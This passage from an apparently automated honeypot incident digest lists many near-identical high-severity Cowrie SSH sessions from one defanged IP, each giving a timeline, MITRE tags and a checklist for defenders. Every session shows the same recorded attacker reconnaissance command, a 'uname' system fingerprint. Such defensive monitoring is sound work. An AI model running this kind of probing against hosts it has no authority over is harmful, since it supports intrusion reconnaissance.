| `2026-07-30 16:48:42` | `cowrie.log.closed` |
| `2026-07-30 16:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6af7fd241df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:46` | `cowrie.session.connect` |
| `2026-07-30 16:48:46` | `cowrie.client.version` |
| `2026-07-30 16:48:46` | `cowrie.client.kex` |
| `2026-07-30 16:48:46` | `cowrie.login.success` |
| `2026-07-30 16:48:47` | `cowrie.session.params` |
| `2026-07-30 16:48:47` | `cowrie.command.input` |
| `2026-07-30 16:48:47` | `cowrie.log.closed` |
| `2026-07-30 16:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4b048b1f58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:52` | `cowrie.session.connect` |
| `2026-07-30 16:48:52` | `cowrie.client.version` |
| `2026-07-30 16:48:52` | `cowrie.client.kex` |
| `2026-07-30 16:48:52` | `cowrie.login.success` |
| `2026-07-30 16:48:54` | `cowrie.session.params` |
| `2026-07-30 16:48:54` | `cowrie.command.input` |
| `2026-07-30 16:48:54` | `cowrie.log.closed` |
| `2026-07-30 16:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1a0e009968

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:57` | `cowrie.session.connect` |
| `2026-07-30 16:48:57` | `cowrie.client.version` |
| `2026-07-30 16:48:57` | `cowrie.client.kex` |
| `2026-07-30 16:48:58` | `cowrie.login.success` |
| `2026-07-30 16:48:58` | `cowrie.session.params` |
| `2026-07-30 16:48:58` | `cowrie.command.input` |
| `2026-07-30 16:48:59` | `cowrie.log.closed` |
| `2026-07-30 16:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c9ceb9ff58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:03` | `cowrie.session.connect` |
| `2026-07-30 16:49:03` | `cowrie.client.version` |
| `2026-07-30 16:49:03` | `cowrie.client.kex` |
| `2026-07-30 16:49:04` | `cowrie.login.success` |
| `2026-07-30 16:49:05` | `cowrie.session.params` |
| `2026-07-30 16:49:05` | `cowrie.command.input` |
| `2026-07-30 16:49:05` | `cowrie.log.closed` |
| `2026-07-30 16:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8661dea2b64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:09` | `cowrie.session.connect` |
| `2026-07-30 16:49:09` | `cowrie.client.version` |
| `2026-07-30 16:49:10` | `cowrie.client.kex` |
| `2026-07-30 16:49:10` | `cowrie.login.success` |
| `2026-07-30 16:49:11` | `cowrie.session.params` |
| `2026-07-30 16:49:11` | `cowrie.command.input` |
| `2026-07-30 16:49:11` | `cowrie.log.closed` |
| `2026-07-30 16:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b2798a7a5a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:15` | `cowrie.session.connect` |
| `2026-07-30 16:49:15` | `cowrie.client.version` |
| `2026-07-30 16:49:15` | `cowrie.client.kex` |
| `2026-07-30 16:49:16` | `cowrie.login.success` |
| `2026-07-30 16:49:17` | `cowrie.session.params` |
| `2026-07-30 16:49:17` | `cowrie.command.input` |
| `2026-07-30 16:49:17` | `cowrie.log.closed` |
| `2026-07-30 16:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd8e47acade

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:21` | `cowrie.session.connect` |
| `2026-07-30 16:49:21` | `cowrie.client.version` |
| `2026-07-30 16:49:21` | `cowrie.client.kex` |
| `2026-07-30 16:49:22` | `cowrie.login.success` |
| `2026-07-30 16:49:23` | `cowrie.session.params` |
| `2026-07-30 16:49:23` | `cowrie.command.input` |
| `2026-07-30 16:49:23` | `cowrie.log.closed` |
| `2026-07-30 16:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c850a016ebca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:27` | `cowrie.session.connect` |
| `2026-07-30 16:49:27` | `cowrie.client.version` |
| `2026-07-30 16:49:27` | `cowrie.client.kex` |
| `2026-07-30 16:49:28` | `cowrie.login.success` |
| `2026-07-30 16:49:29` | `cowrie.session.params` |
| `2026-07-30 16:49:29` | `cowrie.command.input` |
| `2026-07-30 16:49:29` | `cowrie.log.closed` |
| `2026-07-30 16:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-742da7cbe71e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:33` | `cowrie.session.connect` |
| `2026-07-30 16:49:33` | `cowrie.client.version` |
| `2026-07-30 16:49:33` | `cowrie.client.kex` |
| `2026-07-30 16:49:34` | `cowrie.login.success` |
| `2026-07-30 16:49:35` | `cowrie.session.params` |
| `2026-07-30 16:49:35` | `cowrie.command.input` |
| `2026-07-30 16:49:35` | `cowrie.log.closed` |
| `2026-07-30 16:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aedec7b6487

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:38` | `cowrie.session.connect` |
| `2026-07-30 16:49:38` | `cowrie.client.version` |
| `2026-07-30 16:49:38` | `cowrie.client.kex` |
| `2026-07-30 16:49:40` | `cowrie.login.success` |
| `2026-07-30 16:49:41` | `cowrie.session.params` |
| `2026-07-30 16:49:41` | `cowrie.command.input` |
| `2026-07-30 16:49:41` | `cowrie.log.closed` |
| `2026-07-30 16:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef7f720e9f19

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:44` | `cowrie.session.connect` |
| `2026-07-30 16:49:44` | `cowrie.client.version` |
| `2026-07-30 16:49:44` | `cowrie.client.kex` |
| `2026-07-30 16:49:45` | `cowrie.login.success` |
| `2026-07-30 16:49:46` | `cowrie.session.params` |
| `2026-07-30 16:49:46` | `cowrie.command.input` |
| `2026-07-30 16:49:46` | `cowrie.log.closed` |
| `2026-07-30 16:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d6d251f6de8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:50` | `cowrie.session.connect` |
| `2026-07-30 16:49:50` | `cowrie.client.version` |
| `2026-07-30 16:49:50` | `cowrie.client.kex` |
| `2026-07-30 16:49:51` | `cowrie.login.success` |
| `2026-07-30 16:49:52` | `cowrie.session.params` |
| `2026-07-30 16:49:52` | `cowrie.command.input` |
| `2026-07-30 16:49:52` | `cowrie.log.closed` |
| `2026-07-30 16:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-080fcb356d52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:49 |
| **Last Seen** | 2026-07-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:49:56` | `cowrie.session.connect` |
| `2026-07-30 16:49:56` | `cowrie.client.version` |
| `2026-07-30 16:49:56` | `cowrie.client.kex` |
| `2026-07-30 16:49:57` | `cowrie.login.success` |
| `2026-07-30 16:49:58` | `cowrie.session.params` |
| `2026-07-30 16:49:58` | `cowrie.command.input` |
| `2026-07-30 16:49:58` | `cowrie.log.closed` |
| `2026-07-30 16:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d689e4b51bd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:02` | `cowrie.session.connect` |
| `2026-07-30 16:50:02` | `cowrie.client.version` |
| `2026-07-30 16:50:02` | `cowrie.client.kex` |
| `2026-07-30 16:50:03` | `cowrie.login.success` |
| `2026-07-30 16:50:03` | `cowrie.session.params` |
| `2026-07-30 16:50:03` | `cowrie.command.input` |
| `2026-07-30 16:50:04` | `cowrie.log.closed` |
| `2026-07-30 16:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1502a240ca72

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:08` | `cowrie.session.connect` |
| `2026-07-30 16:50:08` | `cowrie.client.version` |
| `2026-07-30 16:50:08` | `cowrie.client.kex` |
| `2026-07-30 16:50:09` | `cowrie.login.success` |
| `2026-07-30 16:50:09` | `cowrie.session.params` |
| `2026-07-30 16:50:09` | `cowrie.command.input` |
| `2026-07-30 16:50:10` | `cowrie.log.closed` |
| `2026-07-30 16:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b2da73e7ed8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:14` | `cowrie.session.connect` |
| `2026-07-30 16:50:14` | `cowrie.client.version` |
| `2026-07-30 16:50:14` | `cowrie.client.kex` |
| `2026-07-30 16:50:15` | `cowrie.login.success` |
| `2026-07-30 16:50:16` | `cowrie.session.params` |
| `2026-07-30 16:50:16` | `cowrie.command.input` |
| `2026-07-30 16:50:16` | `cowrie.log.closed` |
| `2026-07-30 16:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ca701ad679

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:20` | `cowrie.session.connect` |
| `2026-07-30 16:50:20` | `cowrie.client.version` |
| `2026-07-30 16:50:20` | `cowrie.client.kex` |
| `2026-07-30 16:50:20` | `cowrie.login.success` |
| `2026-07-30 16:50:21` | `cowrie.session.params` |
| `2026-07-30 16:50:21` | `cowrie.command.input` |
| `2026-07-30 16:50:21` | `cowrie.log.closed` |
| `2026-07-30 16:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98a78ca1b02e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:25` | `cowrie.session.connect` |
| `2026-07-30 16:50:25` | `cowrie.client.version` |
| `2026-07-30 16:50:26` | `cowrie.client.kex` |
| `2026-07-30 16:50:26` | `cowrie.login.success` |
| `2026-07-30 16:50:27` | `cowrie.session.params` |
| `2026-07-30 16:50:27` | `cowrie.command.input` |
| `2026-07-30 16:50:27` | `cowrie.log.closed` |
| `2026-07-30 16:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddf9df30cc4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:31` | `cowrie.session.connect` |
| `2026-07-30 16:50:32` | `cowrie.client.version` |
| `2026-07-30 16:50:32` | `cowrie.client.kex` |
| `2026-07-30 16:50:33` | `cowrie.login.success` |
| `2026-07-30 16:50:34` | `cowrie.session.params` |
| `2026-07-30 16:50:34` | `cowrie.command.input` |
| `2026-07-30 16:50:35` | `cowrie.log.closed` |
| `2026-07-30 16:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63efb471c28b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:38` | `cowrie.session.connect` |
| `2026-07-30 16:50:38` | `cowrie.client.version` |
| `2026-07-30 16:50:38` | `cowrie.client.kex` |
| `2026-07-30 16:50:39` | `cowrie.login.success` |
| `2026-07-30 16:50:40` | `cowrie.session.params` |
| `2026-07-30 16:50:40` | `cowrie.command.input` |
| `2026-07-30 16:50:40` | `cowrie.log.closed` |
| `2026-07-30 16:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577581aeeb98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:44` | `cowrie.session.connect` |
| `2026-07-30 16:50:44` | `cowrie.client.version` |
| `2026-07-30 16:50:44` | `cowrie.client.kex` |
| `2026-07-30 16:50:45` | `cowrie.login.success` |
| `2026-07-30 16:50:46` | `cowrie.session.params` |
| `2026-07-30 16:50:46` | `cowrie.command.input` |
| `2026-07-30 16:50:46` | `cowrie.log.closed` |
| `2026-07-30 16:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57fec76196d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:49` | `cowrie.session.connect` |
| `2026-07-30 16:50:49` | `cowrie.client.version` |
| `2026-07-30 16:50:49` | `cowrie.client.kex` |
| `2026-07-30 16:50:50` | `cowrie.login.success` |
| `2026-07-30 16:50:51` | `cowrie.session.params` |
| `2026-07-30 16:50:51` | `cowrie.command.input` |
| `2026-07-30 16:50:51` | `cowrie.log.closed` |
| `2026-07-30 16:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2be083df873

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:50 |
| **Last Seen** | 2026-07-30 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:50:56` | `cowrie.session.connect` |
| `2026-07-30 16:50:56` | `cowrie.client.version` |
| `2026-07-30 16:50:56` | `cowrie.client.kex` |
| `2026-07-30 16:50:57` | `cowrie.login.success` |
| `2026-07-30 16:50:58` | `cowrie.session.params` |
| `2026-07-30 16:50:58` | `cowrie.command.input` |
| `2026-07-30 16:50:58` | `cowrie.log.closed` |
| `2026-07-30 16:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681adb205c82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:02` | `cowrie.session.connect` |
| `2026-07-30 16:51:02` | `cowrie.client.version` |
| `2026-07-30 16:51:02` | `cowrie.client.kex` |
| `2026-07-30 16:51:03` | `cowrie.login.success` |
| `2026-07-30 16:51:04` | `cowrie.session.params` |
| `2026-07-30 16:51:04` | `cowrie.command.input` |
| `2026-07-30 16:51:04` | `cowrie.log.closed` |
| `2026-07-30 16:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da9e6a4ce380

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:08` | `cowrie.session.connect` |
| `2026-07-30 16:51:08` | `cowrie.client.version` |
| `2026-07-30 16:51:08` | `cowrie.client.kex` |
| `2026-07-30 16:51:09` | `cowrie.login.success` |
| `2026-07-30 16:51:10` | `cowrie.session.params` |
| `2026-07-30 16:51:10` | `cowrie.command.input` |
| `2026-07-30 16:51:10` | `cowrie.log.closed` |
| `2026-07-30 16:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b976b7a89c27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

